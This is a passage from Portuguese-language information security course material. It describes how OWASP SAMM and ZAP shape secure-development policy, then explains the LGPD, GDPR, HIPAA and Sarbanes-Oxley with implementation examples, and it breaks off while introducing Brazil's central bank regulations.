no desenvolvimento seguro. 
 
3. OWASP SAMM: Maturidade e Gestão da Segurança no Desenvolvimento 
 
O que é? O OWASP Software Assurance Maturity Model (SAMM) é um modelo 
que ajuda as organizações a avaliar e melhorar suas práticas de 
desenvolvimento seguro. Ele fornece uma estrutura para integrar a segurança 
em todas as fases do ciclo de vida de desenvolvimento de software (SDLC). 
 
Como influencia? 

 
 
 
• Implementação de Práticas de Segurança: as políticas de segurança da 
informação baseadas no SAMM garantem que a segurança seja 
considerada em todas as fases do desenvolvimento, desde o 
planejamento até a implantação e manutenção. Isso inclui a definição de 
requisitos de segurança, a realização de testes de segurança e a revisão 
de código. 
• Aperfeiçoamento Contínuo: o SAMM incentiva uma abordagem de 
melhoria contínua, onde as organizações avaliam regularmente suas 
práticas de segurança e implementam melhorias conforme necessário. 
Isso pode levar a revisões periódicas das políticas de desenvolvimento 
seguro para garantir que estejam alinhadas com as melhores práticas. 
 
4. OWASP ZAP e Ferramentas de Testes de Segurança 
 
O que é? O OWASP Zed Attack Proxy (ZAP) é uma das ferramentas de teste de 
segurança mais populares fornecidas pelo OWASP. Ele ajuda a identificar 
vulnerabilidades em aplicações web durante o desenvolvimento e a fase de 
testes. 
 
Como influencia? 
 
• Integração com o Processo de Desenvolvimento: as políticas de 
segurança que seguem as orientações do OWASP muitas vezes exigem 
a integração de ferramentas como o OWASP ZAP no pipeline de 
desenvolvimento contínuo (CI/CD). Isso garante que as vulnerabilidades 
sejam identificadas e corrigidas antes da implantação da aplicação. 
• Automação de Testes de Segurança: ferramentas como o ZAP permitem 
a automação de testes de segurança, o que facilita a detecção de 
problemas em uma fase inicial do desenvolvimento. As políticas de 
segurança podem exigir que os resultados desses testes sejam revisados 
regularmente para garantir que todas as vulnerabilidades sejam 
abordadas. 
 
5. Conformidade e Auditoria de Segurança 
 
O que é? O OWASP fornece uma estrutura que ajuda as organizações a atender 
a requisitos de conformidade de segurança e auditoria. 
 
Como influencia? 
 
• Relatórios e Documentação: as políticas de segurança podem exigir que 
as práticas recomendadas pelo OWASP sejam documentadas e 
auditadas regularmente. Isso inclui a criação de relatórios detalhados 
sobre a conformidade com as práticas de segurança recomendadas, que 
podem ser usados durante auditorias internas e externas. 
• Responsabilidade e Transparência: a adoção das diretrizes do OWASP 
garante que a organização siga uma abordagem transparente e 
responsável na segurança do desenvolvimento de software, o que é 
fundamental para manter a confiança dos clientes e cumprir com 
regulamentações de segurança. 

 
 
 
 
 
O OWASP exerce uma influência significativa sobre as políticas de segurança 
da informação relacionadas ao desenvolvimento seguro, fornecendo um 
conjunto de melhores práticas, padrões, ferramentas e modelos de maturidade 
que ajudam as organizações a criar software seguro e resistente a ameaças 
cibernéticas. Ao incorporar as diretrizes do OWASP em suas políticas de 
segurança, as organizações podem garantir que a segurança seja integrada em 
todas as etapas do ciclo de desenvolvimento de software, reduzindo o risco de 
vulnerabilidades e fortalecendo a proteção contra ataques cibernéticos. 
 
 
Referência: https://cheatsheetseries.owasp.org/index.html 
 
 
 
2.3. REGULAMENTAÇÕES NACIONAIS E INTERNACIONAIS 
 
As normas, regulamentações de segurança da informação e leis relacionadas a 
privacidade servem para proteger a confidencialidade, integridade e 
disponibilidade das informações, além de garantir os direitos à privacidade dos 
indivíduos. Elas visam focar em questões como: 
Proteção de Dados Pessoais: garantir que os dados pessoais sejam coletados, 
armazenados e processados de maneira segura e ética, protegendo os direitos 
dos indivíduos à privacidade e à proteção de suas informações. 
Confidencialidade: assegurar que informações sensíveis sejam acessíveis 
apenas por pessoas autorizadas, prevenindo o acesso não autorizado e a 
divulgação de dados confidenciais. 
Integridade: garantir que as informações não sejam alteradas ou destruídas de 
maneira não autorizada, mantendo a precisão e a confiabilidade dos dados. 
Disponibilidade: assegurar que as informações e os sistemas estejam 
disponíveis para uso quando necessário, prevenindo interrupções no acesso a 
dados importantes. 
Responsabilização: estabelecer responsabilidades e penalidades para 
indivíduos e organizações que não cumpram com as normas e regulamentações, 
incentivando o cumprimento das melhores práticas de segurança. 
Transparência: promover a transparência nas práticas de tratamento de dados, 
garantindo que os indivíduos saibam como suas informações estão sendo 
utilizadas e protegidas. 
Resiliência: aumentar a resiliência das organizações contra incidentes de 
segurança, como ataques cibernéticos, garantindo uma resposta rápida e eficaz 
a qualquer ameaça ou vulnerabilidade. 

 
 
Conformidade Legal: assegurar que as organizações cumpram com as leis e 
regulamentações locais e internacionais, evitando sanções legais e financeiras. 
Considere que normas como as da família ISO 27000 são fundamentais para 
criação e promoção de ambientes seguros e confiáveis para proteção e 
tratamento de dados e informações das pessoas, bem como manter um nível 
tolerável de segurança nas companhias. Entretanto, outras normas, leis e órgãos 
reguladores também cumprem esse papel, destacando: 
 
Lei Geral de Proteção de Dados:  
 
A Lei Geral de Proteção de Dados (LGPD) é a legislação brasileira que regula o 
tratamento de dados pessoais de indivíduos, tanto no ambiente online quanto 
offline. Inspirada no Regulamento Geral sobre a Proteção de Dados (GDPR) da 
União Europeia, a LGPD foi sancionada em agosto de 2018 e entrou em vigor 
em setembro de 2020. Esta lei estabelece diretrizes rigorosas sobre como as 
organizações devem coletar, armazenar, processar e compartilhar dados 
pessoais, com o objetivo de proteger a privacidade dos cidadãos e garantir o 
direito à proteção dos dados pessoais. 
 
A LGPD se aplica a qualquer organização, pública ou privada, que trate dados 
pessoais de indivíduos localizados no Brasil, independentemente de onde a 
empresa esteja sediada. A lei define dados pessoais como qualquer informação 
relacionada a uma pessoa natural identificada ou identificável, como nome, 
endereço, e-mail, número de telefone, entre outros. Além disso, a LGPD introduz 
o conceito de dados pessoais sensíveis, que inclui informações sobre origem 
racial ou étnica, convicção religiosa, opinião política, dados genéticos ou 
biométricos, entre outros. 
 
LGPD em detalhes 
 
A LGPD estabelece dez princípios fundamentais para o tratamento de dados 
pessoais: 
 
1. Finalidade: os dados pessoais devem ser tratados para propósitos legítimos, 
específicos e informados ao titular dos dados. 
 
2. Adequação: o tratamento deve ser compatível com a finalidade informada ao 
titular dos dados. 
 
3. Necessidade: apenas os dados necessários para o cumprimento da finalidade 
devem ser tratados. 
 
4. Livre Acesso: o titular dos dados tem o direito de acessar e revisar as 
informações sobre o tratamento de seus dados. 
 
5. Qualidade dos Dados: os dados tratados devem ser exatos, claros e 
atualizados. 
 
6. Transparência: as informações sobre o tratamento de dados devem ser claras 
e acessíveis ao titular. 

 
 
 
7. Segurança: medidas técnicas e administrativas devem ser adotadas para 
proteger os dados pessoais contra acessos não autorizados e incidentes. 
 
8. Prevenção: deve-se prevenir a ocorrência de danos aos titulares dos dados. 
 
9. Não Discriminação: os dados pessoais não podem ser usados para fins 
discriminatórios, ilícitos ou abusivos. 
 
10. Responsabilização e Prestação de Contas: as organizações devem 
demonstrar que estão cumprindo com os princípios e requisitos da LGPD. 
 
Importância da LGPD na Segurança da Informação 
 
1. Proteção da privacidade 
 
A LGPD é essencial para a proteção da privacidade dos cidadãos brasileiros. Ao 
estabelecer regras claras sobre como os dados pessoais devem ser tratados, a 
lei garante que as informações dos indivíduos sejam usadas de maneira justa e 
transparente, respeitando a dignidade e a autonomia dos titulares dos dados. 
 
 
2. Conformidade legal 
 
A conformidade com a LGPD é obrigatória para qualquer organização que trate 
dados pessoais no Brasil. A não conformidade pode resultar em sanções 
severas, incluindo multas que podem chegar a 2% do faturamento da empresa, 
limitadas a R$ 50 milhões por infração, além de restrições ao uso de dados e 
danos à reputação. 
 
 
3. Fortalecimento da Segurança da Informação 
 
A LGPD exige que as organizações implementem medidas técnicas e 
administrativas adequadas para proteger os dados pessoais contra acessos não 
autorizados, vazamentos, perdas e outros incidentes. Isso reforça a importância 
de políticas robustas de segurança da informação, ajudando a prevenir e mitigar 
riscos cibernéticos. 
 
 
4. Transparência e confiança 
 
A lei promove a transparência ao exigir que as organizações informem 
claramente como e por que os dados pessoais estão sendo coletados e 
utilizados. Isso aumenta a confiança dos consumidores e outras partes 
interessadas na organização, criando um ambiente de negócios mais seguro e 
confiável. 
 
 
5. Empoderamento dos titulares de dados 
 
A LGPD dá aos indivíduos maior controle sobre seus dados pessoais, permitindo 
que eles acessem, corrijam, excluam ou restrinjam o tratamento de suas 
informações. Esse empoderamento é fundamental para garantir que os direitos 

 
 
dos cidadãos sejam respeitados e que as organizações sejam responsabilizadas 
por suas práticas de tratamento de dados. 
 
 
6. Prevenção de incidentes de segurança 
 
Ao exigir a adoção de medidas preventivas e de segurança, a LGPD ajuda as 
organizações a identificar e corrigir vulnerabilidades em seus sistemas e 
processos antes que ocorram incidentes de segurança. Isso reduz a 
probabilidade de vazamentos de dados e outras violações que poderiam causar 
danos significativos tanto para os titulares dos dados quanto para as empresas. 
 
7. Competitividade no Mercado 
 
Empresas que demonstram conformidade com a LGPD e um compromisso sério 
com a proteção de dados pessoais podem ganhar uma vantagem competitiva no 
mercado. Consumidores e parceiros de negócios estão cada vez mais atentos à 
maneira como seus dados são tratados, e preferem se associar a organizações 
que respeitam suas obrigações legais e éticas. 
 
Exemplos de Implementação da LGPD 
 
Setor de e-commerce 
 
Cenário: um site de comércio eletrônico que coleta informações de pagamento 
e dados de clientes implementa as diretrizes da LGPD para garantir a proteção 
dos dados pessoais. 
 
Implementação: a empresa adota criptografia para proteger os dados de 
pagamento, solicita consentimento explícito dos usuários antes de coletar 
informações pessoais, e fornece uma política de privacidade clara e acessível. 
Além disso, a empresa permite que os clientes acessem, modifiquem ou excluam 
seus dados a qualquer momento. 
 
Instituições financeiras 
Cenário: um banco adota medidas de conformidade com a LGPD para proteger 
os dados pessoais e sensíveis de seus clientes, como histórico financeiro e 
dados biométricos. 
 
Implementação: o banco realiza uma avaliação de impacto sobre a proteção de 
dados (DPIA) para identificar riscos associados ao tratamento de dados, 
implementa medidas de segurança avançadas, como autenticação multifatorial, 
e estabelece um comitê de proteção de dados para supervisionar a conformidade 
contínua com a LGPD. 
 
Empresas de saúde 
 
Cenário: uma clínica médica implementa a LGPD para garantir que os dados de 
saúde dos pacientes sejam tratados com a máxima segurança e 
confidencialidade. 
 

 
 
Implementação: a clínica adota medidas rigorosas de controle de acesso para 
garantir que apenas pessoal autorizado tenha acesso aos prontuários médicos 
dos pacientes. Também implementa políticas claras para o descarte seguro de 
informações antigas e oferece treinamento regular aos funcionários sobre as 
melhores práticas de segurança de dados. 
 
 
Para concluir, a LGPD é uma legislação fundamental para garantir a proteção 
dos dados pessoais no Brasil. Sua implementação eficaz não só protege os 
direitos dos cidadãos, mas também reforça a importância da segurança da 
informação nas organizações. Ao promover a transparência, aumentar a 
confiança dos consumidores e garantir a conformidade com as normas de 
proteção de dados, a LGPD ajuda a criar um ambiente digital mais seguro e ético 
para todos. 
 
Referência: https://www.planalto.gov.br/ccivil_03/_ato2015-
2018/2018/lei/l13709.htm 
 
 
 
General Data Protection Regulation 
 
O Regulamento Geral sobre a Proteção de Dados (GDPR, na sigla em inglês) é 
a legislação da União Europeia que regula o tratamento de dados pessoais dos 
cidadãos europeus. Entrou em vigor em 25 de maio de 2018 e é considerado um 
dos marcos mais importantes na proteção da privacidade na era digital. O GDPR 
estabelece padrões rigorosos para a coleta, processamento, armazenamento e 
compartilhamento de dados pessoais, com o objetivo de proteger a privacidade 
dos indivíduos e garantir que seus dados sejam tratados de maneira segura e 
ética. 
 
A Lei Geral de Proteção de Dados (LGPD) do Brasil, por sua vez, é uma 
legislação inspirada no GDPR, que visa proteger os dados pessoais dos 
cidadãos brasileiros. Embora a LGPD compartilhe muitos princípios e requisitos 
com o GDPR, existem algumas diferenças importantes entre as duas leis. 
 
GDPR em detalhes 
 
O GDPR se aplica a qualquer organização, independentemente de sua 
localização, desde que processe dados pessoais de indivíduos na União 
Europeia. Isso significa que empresas fora da Europa, mas que oferecem 
produtos ou serviços a cidadãos europeus ou monitoram o comportamento de 
indivíduos na UE, também estão sujeitas ao GDPR. A lei abrange dados 
pessoais como nomes, endereços, identificadores online, dados de localização, 
entre outros, e impõe severas penalidades para organizações que não 
cumprirem suas exigências. 
 
Os principais pontos do GDPR incluem 
 
1. Consentimento 
 

 
 
O GDPR exige que o consentimento para o tratamento de dados pessoais seja 
claro, explícito e informado. O consentimento não pode ser presumido, e os 
indivíduos têm o direito de retirar seu consentimento a qualquer momento. 
 
 
2. Direitos dos Titulares dos Dados 
 
O GDPR concede aos indivíduos uma série de direitos sobre seus dados 
pessoais, incluindo o direito de acesso, retificação, apagamento (direito ao 
esquecimento), restrição de processamento, portabilidade dos dados e o direito 
de se opor ao processamento. 
 
 
3. Responsabilidade e Conformidade 
 
As organizações devem demonstrar conformidade com o GDPR através de 
medidas como a realização de avaliações de impacto sobre a proteção de dados 
(DPIA), a nomeação de um Encarregado de Proteção de Dados (DPO) em 
determinados casos, e a manutenção de registros detalhados das atividades de 
processamento de dados. 
 
4. Notificação de Violação de Dados 
 
O GDPR exige que as organizações notifiquem as autoridades de supervisão e 
os indivíduos afetados dentro de 72 horas após a descoberta de uma violação 
de dados que possa resultar em um risco para os direitos e liberdades dos 
indivíduos. 
 
5. Transferências Internacionais de Dados 
 
O GDPR impõe restrições rigorosas à transferência de dados pessoais para fora 
da União Europeia, exigindo que os países de destino ofereçam um nível 
adequado de proteção de dados, ou que sejam implementadas salvaguardas 
apropriadas. 
 
Diferenças significativas entre GDPR e LGPD 
 
Embora o GDPR e a LGPD compartilhem muitos princípios e estruturas, como a 
proteção dos direitos dos titulares de dados e a exigência de consentimento 
explícito, existem algumas diferenças importantes entre as duas legislações: 
 
1. Escopo Territorial 
 
GDPR: aplica-se a qualquer organização que processe dados pessoais de 
indivíduos na UE, independentemente de onde a organização esteja localizada. 
 
LGPD: aplica-se a organizações que processam dados pessoais de indivíduos 
no Brasil ou que oferecem produtos ou serviços no Brasil, independentemente 
de onde a organização esteja sediada. 
 
2. Base Legal para o Tratamento de Dados 
 

 
 
GDPR: além do consentimento, o GDPR permite o processamento de dados 
pessoais com base em várias outras justificativas, incluindo o cumprimento de 
uma obrigação legal, a execução de um contrato, a proteção de interesses vitais, 
o interesse público, e os interesses legítimos do controlador ou de terceiros. 
 
LGPD: a LGPD também reconhece essas bases legais, mas oferece uma 
flexibilidade um pouco maior em algumas áreas, como a utilização do interesse 
legítimo. 
 
 
3. Direitos dos Titulares de Dados 
 
GDPR: oferece direitos amplos, como o direito ao apagamento (direito ao 
esquecimento), o direito à portabilidade dos dados e o direito de se opor ao 
processamento. 
 
LGPD: os direitos dos titulares de dados na LGPD são semelhantes aos do 
GDPR, mas com algumas nuances. Por exemplo, a LGPD permite a 
anonimização dos dados pessoais em certas circunstâncias, em vez de exigir 
sua exclusão completa. 
 
 
4. Encarregado de Proteção de Dados (DPO) 
 
GDPR: exige a nomeação de um DPO para organizações públicas, e para 
aquelas que realizam monitoramento regular e sistemático em grande escala ou 
processam categorias especiais de dados em grande escala. 
 
LGPD: também exige a nomeação de um Encarregado de Proteção de Dados, 
mas dá mais flexibilidade para pequenas empresas e startups, que podem estar 
isentas dessa exigência dependendo da escala e do escopo do processamento 
de dados. 
 
5. Penalidades 
 
GDPR: impõe multas significativas, que podem chegar a 20 milhões de euros ou 
4% do faturamento anual global da organização, o que for maior. 
 
LGPD: impõe multas que podem chegar a 2% do faturamento da empresa no 
Brasil, limitadas a R$ 50 milhões por infração. Além disso, a LGPD permite a 
suspensão temporária ou proibição do exercício de atividades relacionadas ao 
processamento de dados. 
 
 
6. Notificação de Violação de Dados 
 
GDPR: exige que as organizações notifiquem as autoridades de supervisão e os 
titulares dos dados em até 72 horas após a identificação de uma violação de 
dados. 
 
LGPD: exige a notificação da autoridade nacional e dos titulares dos dados, mas 
o prazo não é definido explicitamente, sendo determinado caso a caso pela 
Autoridade Nacional de Proteção de Dados (ANPD). 
 

 
 
Importância do GDPR (e da LGPD) na Segurança da Informação 
 
1. Proteção de Direitos Individuais 
 
Ambas as leis têm como objetivo proteger os direitos fundamentais à privacidade 
e à proteção de dados pessoais. Ao impor regras rigorosas sobre o tratamento 
de dados, elas garantem que os indivíduos tenham controle sobre suas 
informações e podem exigir responsabilidade das organizações. 
 
 
2. Responsabilidade das Organizações 
 
Tanto o GDPR quanto a LGPD colocam a responsabilidade sobre as 
organizações para garantir que os dados pessoais sejam tratados de maneira 
segura e ética. Isso inclui a implementação de medidas de segurança robustas 
para proteger contra acessos não autorizados, vazamentos e outros incidentes 
de segurança. 
 
3. Aperfeiçoamento das Práticas de Segurança 
 
As exigências rigorosas dessas leis incentivam as organizações a melhorar 
continuamente suas práticas de segurança da informação, adotando novas 
tecnologias e processos para proteger os dados pessoais de maneira mais 
eficaz. 
 
4. Aumento da Confiança dos Consumidores 
 
Cumprir com o GDPR e a LGPD demonstra um compromisso com a privacidade 
e a segurança dos dados, o que pode aumentar a confiança dos consumidores 
e fortalecer a reputação da empresa. 
 
5. Harmonização Global 
 
Embora existam diferenças entre o GDPR e a LGPD, ambas as leis estão 
alinhadas com uma tendência global de harmonização das normas de proteção 
de dados. Isso facilita a conformidade para empresas que operam em múltiplas 
jurisdições, promovendo uma abordagem global mais coerente para a segurança 
da informação. 
 
 
O GDPR e a LGPD representam avanços significativos na proteção de dados 
pessoais, estabelecendo padrões rigorosos para o tratamento de informações 
sensíveis e impondo responsabilidades claras para as organizações. Embora 
existam diferenças importantes entre as duas leis, ambas compartilham o 
objetivo de proteger a privacidade dos indivíduos e garantir que os dados 
pessoais sejam tratados de maneira segura e transparente. Para as 
organizações, a conformidade com essas leis não só evita penalidades severas, 
mas também fortalece a confiança do consumidor e promove uma cultura de 
segurança da informação robusta. 
 
Referência: https://gdpr-info.eu/ 
 

 
 
 
 
Health Insurance Portability and Accountability Act 
 
A Health Insurance Portability and Accountability Act (HIPAA) é uma legislação 
dos Estados Unidos que estabelece padrões nacionais para a proteção de 
informações médicas e de saúde dos indivíduos. Sancionada em 1996, a HIPAA 
visa garantir a privacidade e a segurança dos dados de saúde, assegurando que 
as informações pessoais de pacientes sejam tratadas com o mais alto nível de 
confidencialidade e integridade. Esta lei é particularmente relevante para 
organizações e profissionais de saúde, seguradoras e outros negócios que lidam 
com informações de saúde protegidas (PHI - Protected Health Information). 
 
HIPAA em detalhes 
 
A HIPAA abrange duas principais regras que são cruciais para a segurança da 
informação: 
 
1. Regra de Privacidade (Privacy Rule) 
 
A Regra de Privacidade da HIPAA estabelece normas para a proteção de 
informações de saúde que identificam os indivíduos. Ela define como as 
informações de saúde protegidas (PHI) podem ser usadas e divulgadas por 
entidades cobertas, como provedores de saúde, seguradoras e centros de 
serviços de saúde. Também concede aos pacientes direitos sobre suas 
informações de saúde, como o direito de acessar seus registros médicos e 
solicitar correções. 
 
2. Regra de Segurança (Security Rule) 
 
A Regra de Segurança da HIPAA complementa a Regra de Privacidade, 
estabelecendo normas para proteger as informações de saúde eletrônicas (ePHI 
- Electronic Protected Health Information). Esta regra exige que as entidades 
cobertas implementem salvaguardas físicas, administrativas e técnicas para 
proteger ePHI contra acessos não autorizados, alterações, exclusões e outros 
riscos à segurança 
 
Componentes Principais da HIPAA 
 
1. Salvaguardas Administrativas 
Envolvem políticas e procedimentos que gerenciam a conduta do pessoal em 
relação à proteção das ePHI. Isso inclui a gestão de riscos, designação de um 
oficial de segurança, e a implementação de planos de contingência. 
 
2. Salvaguardas Físicas 
 
Relacionam-se à proteção dos sistemas de informações ePHI e das instalações 
em que os dados são armazenados. Isso inclui o controle de acesso físico, a 
segurança dos dispositivos e a proteção contra desastres naturais. 
 
3. Salvaguardas Técnicas 

 
 
 
Incluem o uso de tecnologia para proteger ePHI, como controles de acesso, 
criptografia, autenticação de usuários, e mecanismos para garantir a integridade 
dos dados. 
 
4.Notificação de Violação 
 
A HIPAA exige que as entidades cobertas notifiquem os indivíduos e as 
autoridades competentes em caso de violação de informações de saúde 
protegidas que comprometa a privacidade ou a segurança das informações. 
 
Importância da HIPAA na Segurança da Informação 
 
Proteção da privacidade dos pacientes 
 
1. A HIPAA é fundamental para garantir que as informações de saúde dos 
pacientes sejam tratadas com o mais alto grau de confidencialidade. A lei impede 
que as informações de saúde sejam acessadas ou divulgadas sem o 
consentimento adequado, protegendo a privacidade dos pacientes e garantindo 
que suas informações sejam usadas apenas para fins legítimos e autorizados. 
 
2. Segurança da informação em saúde 
 
A Regra de Segurança da HIPAA estabelece requisitos rigorosos para a proteção 
de informações de saúde eletrônicas, o que é crucial em um ambiente onde a 
digitalização dos dados de saúde é cada vez mais comum. Ao exigir a 
implementação de salvaguardas administrativas, físicas e técnicas, a HIPAA 
ajuda a prevenir acessos não autorizados, vazamentos de dados e outros 
incidentes de segurança. 
 
3. Responsabilidade das entidades cobertas 
 
A HIPAA impõe responsabilidades claras às entidades cobertas e seus parceiros 
de negócios para garantir que as informações de saúde sejam protegidas em 
todas as etapas do tratamento. Isso inclui a criação de políticas de segurança 
robustas, a realização de avaliações de riscos e a adoção de medidas para 
corrigir vulnerabilidades identificadas. 
 
4. Conformidade legal e evitação de penalidades 
 
A conformidade com a HIPAA é obrigatória para todas as entidades cobertas nos 
Estados Unidos. A não conformidade pode resultar em penalidades financeiras 
significativas, ações legais e danos à reputação da organização. Além disso, as 
organizações que violam as normas da HIPAA podem enfrentar auditorias 
rigorosas e sanções por parte das autoridades reguladoras. 
 
5. Aumento da confiança dos pacientes 
 
A proteção rigorosa das informações de saúde aumenta a confiança dos 
pacientes nas instituições de saúde. Quando os pacientes têm certeza de que 
suas informações estão seguras e protegidas contra acessos não autorizados, 

 
 
eles ficam mais dispostos a compartilhar informações completas e precisas, o 
que é essencial para o atendimento de qualidade. 
 
6. Promoção de melhores práticas em segurança da informação 
 
A HIPAA incentiva a adoção de melhores práticas em segurança da informação, 
como o uso de criptografia, autenticação multifatorial e monitoramento contínuo 
de sistemas. Essas práticas não apenas protegem as informações de saúde, 
mas também ajudam as organizações a fortalecer sua postura geral de 
segurança cibernética. 
 
Exemplos de implementação da HIPAA 
 
Hospitais e clínicas 
 
Cenário: um grande hospital adota a HIPAA para garantir que todos os registros 
eletrônicos de saúde dos pacientes sejam protegidos contra acessos não 
autorizados e violações. 
 
Implementação: o hospital implementa controles de acesso rigorosos, incluindo 
autenticação multifatorial para médicos e enfermeiros que acessam registros 
eletrônicos de saúde. Além disso, os dados são criptografados tanto em repouso 
quanto em trânsito, e o hospital realiza auditorias regulares para monitorar o 
cumprimento das políticas de segurança. 
 
Seguradoras de saúde 
 
Cenário: uma seguradora de saúde utiliza a HIPAA para garantir que as 
informações pessoais de seus beneficiários sejam protegidas contra violações e 
uso indevido. 
 
Implementação: a seguradora estabelece políticas de segurança robustas, 
realiza treinamentos regulares para os funcionários sobre a importância da 
privacidade dos dados e adota sistemas de monitoramento para detectar e 
responder rapidamente a quaisquer tentativas de acesso não autorizado. 
 
Empresas de tecnologia da saúde 
 
Cenário: uma empresa que fornece software de gestão para clínicas médicas 
implementa a HIPAA para garantir que sua plataforma esteja em conformidade 
com os requisitos de segurança e privacidade de dados. 
 
Implementação: a empresa incorpora criptografia forte em seu software, oferece 
funcionalidades de auditoria para seus clientes monitorarem o acesso aos 
dados, e realiza testes de penetração regulares para identificar e corrigir 
possíveis vulnerabilidades. 
 
 
 
A HIPAA é uma legislação crucial para garantir a segurança e a privacidade das 
informações de saúde nos Estados Unidos. Ela estabelece padrões rigorosos 

 
 
que ajudam a proteger os dados dos pacientes contra acessos não autorizados, 
vazamentos e outras ameaças à segurança. Para as organizações que lidam 
com informações de saúde, a conformidade com a HIPAA não só é uma 
exigência legal, mas também uma oportunidade de fortalecer a confiança dos 
pacientes, melhorar a qualidade dos cuidados e promover uma cultura de 
segurança da informação robusta e proativa. 
 
 
Referência: https://www.hhs.gov/hipaa/index.html 
 
 
 
Sarbanes-Oxley Act:  
 
A Sarbanes-Oxley Act (SOx) é uma legislação dos Estados Unidos aprovada em 
2002, em resposta a grandes escândalos corporativos que abalaram a confiança 
dos investidores, como os casos da Enron e da WorldCom. Esta lei foi criada 
para proteger os investidores, aumentando a precisão e a confiabilidade das 
divulgações corporativas feitas pelas empresas públicas. Embora a SOx seja 
principalmente conhecida por suas implicações contábeis e financeiras, ela 
também tem um impacto significativo na segurança da informação, 
especialmente em como as empresas gerenciam e protegem seus dados 
financeiros. 
 
SOx em detalhes 
 
A SOx impõe uma série de requisitos de governança corporativa e relatórios 
financeiros para empresas públicas nos Estados Unidos. A lei exige que as 
empresas mantenham controles internos rigorosos e procedimentos para 
garantir a precisão das informações financeiras divulgadas. Além disso, a SOx 
estabelece 
penalidades 
severas 
para 
executivos 
corporativos 
que 
deliberadamente divulgam informações financeiras falsas ou enganosas. 
 
Os principais títulos da SOx que impactam a segurança da informação incluem: 
 
Seção 302: Responsabilidade Corporativa pelas Divulgações Financeiras 
 
Exige que os executivos seniores (como o CEO e o CFO) certifiquem a exatidão 
das demonstrações financeiras e a eficácia dos controles internos. Isso inclui a 
segurança dos sistemas que geram essas informações. 
 
Seção 404: Controle Interno Sobre Relatórios Financeiros 
 
Exige que as empresas estabeleçam e mantenham um sistema de controles 
internos para garantir a integridade dos relatórios financeiros. As empresas 
devem também realizar auditorias anuais desses controles internos e divulgar os 
resultados ao público. 
 
Seção 802: Penalidades por Alteração de Registros 
 

 
 
Impõe penalidades criminais para a destruição, alteração ou falsificação de 
registros financeiros. Isso inclui a proteção de registros eletrônicos e a 
necessidade de políticas de retenção de dados robustas. 
 
Importância da SOx na Segurança da Informação 
 
1. Garantia da Integridade dos Dados 
 
A SOx exige que as empresas públicas implementem controles internos eficazes 
para proteger a integridade das informações financeiras. Isso significa que as 
empresas devem garantir que seus sistemas de TI sejam seguros, que os dados 
financeiros não possam ser manipulados sem autorização, e que haja 
mecanismos de auditoria em vigor para rastrear qualquer alteração nos dados. 
 
2. Segurança e Conformidade 
 
Para estar em conformidade com a SOx, as empresas precisam adotar medidas 
de segurança rigorosas que protejam os sistemas e os dados financeiros contra 
acessos não autorizados, perda de dados e outras ameaças. Isso inclui a 
implementação de controles de acesso, criptografia, auditorias regulares e 
monitoramento contínuo de sistemas. 
 
3. Responsabilização Executiva 
 
Uma das principais características da SOx é a responsabilização dos executivos 
corporativos pela precisão dos relatórios financeiros. Os CEOs e CFOs devem 
certificar pessoalmente que os controles internos são eficazes, o que leva a uma 
maior ênfase na segurança da informação para garantir que todos os dados 
financeiros sejam precisos e protegidos contra manipulação ou perda. 
 
4. Transparência e Confiança dos Investidores 
 
A SOx foi criada para restaurar a confiança dos investidores nas empresas 
públicas. A transparência nos relatórios financeiros, garantida por controles 
internos eficazes, é crucial para manter essa confiança. As empresas que 
cumprem rigorosamente a SOx demonstram um compromisso com a 
honestidade e a integridade, o que pode resultar em maior confiança dos 
investidores e em um valor de mercado mais estável. 
 
5. Mitigação de Riscos 
 
A conformidade com a SOx exige que as empresas realizem avaliações 
regulares de riscos e implementem medidas para mitigar qualquer ameaça à 
segurança dos dados financeiros. Isso ajuda a proteger as empresas contra 
fraudes internas, erros, e outros problemas que poderiam comprometer a 
integridade dos relatórios financeiros. 
 
6. Auditoria e Monitoramento Contínuo 
 
A SOx impõe a necessidade de auditorias internas e externas dos controles 
internos, o que inclui a segurança da informação. Esse processo contínuo de 

 
 
auditoria ajuda as empresas a identificar e corrigir vulnerabilidades em seus 
sistemas de TI, garantindo que estejam sempre em conformidade com os 
requisitos legais. 
 
Exemplos de Implementação da SOx 
 
Empresas financeiras 
 
Cenário: um grande banco adota a SOx para garantir que seus relatórios 
financeiros sejam precisos e estejam em conformidade com as exigências 
regulatórias. 
 
Implementação: o banco implementa controles de acesso rigorosos para 
proteger seus sistemas de contabilidade, utiliza criptografia para proteger dados 
financeiros sensíveis, e realiza auditorias regulares para garantir que todas as 
transações financeiras sejam registradas de forma precisa e segura. 
 
Companhias de tecnologia 
 
Cenário: uma empresa de software que fornece soluções de contabilidade para 
outras empresas públicas precisam estar em conformidade com a SOx para 
proteger os dados financeiros de seus clientes. 
 
Implementação: a empresa implementa um sistema de gestão de registros 
robusto que garante a integridade e a disponibilidade dos dados financeiros, 
além de realizar testes de penetração regulares para identificar e corrigir 
possíveis vulnerabilidades em seu software. 
 
Indústrias de manufatura 
 
Cenário: uma empresa de manufatura que é negociada publicamente nos EUA 
adota a SOx para proteger seus sistemas de produção e os dados financeiros 
relacionados. 
 
Implementação: a empresa implementa políticas de retenção de dados e um 
sistema de backup seguro para garantir que todos os registros financeiros 
estejam protegidos contra perda ou alteração. Além disso, a empresa monitora 
continuamente seus sistemas para detectar qualquer atividade suspeita que 
possa comprometer a integridade dos dados. 
 
 
 
A Sarbanes-Oxley Act (SOx) é uma legislação essencial para garantir a precisão 
e a integridade dos relatórios financeiros das empresas públicas. Além de suas 
implicações contábeis e de governança, a SOx tem um impacto significativo na 
segurança da informação, exigindo que as empresas implementem controles 
rigorosos para proteger seus dados financeiros. A conformidade com a SOx não 
só evita penalidades legais e protege os executivos contra responsabilidade 
pessoal, mas também aumenta a confiança dos investidores e promove uma 
cultura organizacional de transparência e integridade. Para as empresas, a SOx 

 
 
é uma oportunidade de fortalecer suas práticas de segurança da informação e 
garantir que seus sistemas e dados estejam sempre protegidos. 
 
 
Referência: https://pt.wikipedia.org/wiki/Lei_Sarbanes-Oxley 
 
 
 
BACEN 
 
Banco Central do Brasil, ou BACEN, é a instituição governamental que regula 
resoluções focadas em Open Banking, Pix e outras questões relacionadas a 
segurança, privacidade e fraudes bancárias. 
 
Podemos ainda aprofundar alguns aspectos do BACEN relevantes e inerentes a 
segurança da informação no Brasil, pois ele desempenha um papel fundamental 
na regulação do sistema financeiro do país, estabelecendo diretrizes e normas 
que asseguram a estabilidade, a eficiência e a segurança do setor. Entre essas 
diretrizes, o BACEN inclui uma série de regulamentações específicas voltadas 
para a segurança da informação, especialmente no que se refere às instituições 
financeiras. Essas regulamentações influenciam diretamente as políticas de 
